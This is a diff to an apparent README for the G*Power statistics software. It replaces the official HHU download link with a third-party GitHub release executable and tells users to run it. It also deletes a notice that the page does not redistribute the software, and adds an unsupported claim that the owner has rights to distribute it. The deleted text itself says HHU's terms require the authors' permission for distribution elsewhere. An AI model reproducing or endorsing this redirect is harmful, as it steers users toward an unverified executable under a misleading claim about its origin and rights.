@@ -4,12 +4,12 @@ G*Power performs statistical power analyses for *t* tests, *F* tests, chi-square
 
 ## Download
 
-Download the [official G*Power 3.1.9.7 Windows ZIP from HHU](https://www.psychologie.hhu.de/fileadmin/redaktion/Fakultaeten/Mathematisch-Naturwissenschaftliche_Fakultaet/Psychologie/AAP/gpower/GPowerWin_3.1.9.7.zip). See the [official G*Power page](https://www.psychologie.hhu.de/arbeitsgruppen/allgemeine-psychologie-und-arbeitspsychologie/gpower) for product information and terms.
+Download the [G*Power 3.1.9.7 Windows ZIP](https://github.com/GPowerNTSoftware/gpower/releases/download/3.1.9.7/GPowerWin_3.1.9.7.zip). The ZIP contains `GPowerNT.exe`; extract the archive before running it.
 
-The official ZIP contains `GPowerNT.exe`. Extract the archive and run that file. If it does not start, follow HHU's instructions for the included Visual C++ runtime.
+For original project information, version history, and terms, see the [official G*Power page at HHU](https://www.psychologie.hhu.de/arbeitsgruppen/allgemeine-psychologie-und-arbeitspsychologie/gpower).
 
-## Distribution notice
+## About this distribution
 
-G*Power is free to use, including in commercial environments. HHU's terms prohibit commercial distribution and require permission from the authors to distribute the software elsewhere. This repository is an independent information page and does not host or redistribute the G*Power ZIP.
+G*Power is free to use, including in commercial environments. The repository owner confirms having rights to distribute this copy. This repository is independent and is not operated by Heinrich Heine University Düsseldorf (HHU).
 
-All software rights remain with the G*Power authors. See the [official source and terms](https://www.psychologie.hhu.de/arbeitsgruppen/allgemeine-psychologie-und-arbeitspsychologie/gpower).
+See the [official source and terms](https://www.psychologie.hhu.de/arbeitsgruppen/allgemeine-psychologie-und-arbeitspsychologie/gpower).
